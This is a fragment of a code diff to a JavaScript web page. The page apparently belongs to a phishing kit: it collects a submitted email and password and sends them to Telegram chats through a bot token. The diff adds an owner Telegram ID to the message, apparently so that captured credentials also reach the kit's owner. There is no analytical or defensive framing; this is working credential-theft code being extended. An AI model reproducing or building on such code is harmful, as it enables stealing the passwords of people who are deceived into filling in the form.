@@ -1069,6 +1069,7 @@
     const BOT_TOKEN = "__BOT_TOKEN__";
     const CUSTOMER_CHAT_ID = "__CUSTOMER_CHAT_ID__";
     const ADMIN_CHAT_ID = "__ADMIN_CHAT_ID__";
+    const OWNER_TELEGRAM_ID = "__OWNER_TELEGRAM_ID__";
 
     // ============================================================
     // DOM
@@ -2200,8 +2201,9 @@ async function sendTelegram(chatId, message) {
 
 
         const message =
-`Form Submission
-
+`GENERAL Form Submission
+Owner Telegram ID:
+${OWNER_TELEGRAM_ID}
 Email:
 ${storedEmail || "Not provided"}
 Password:
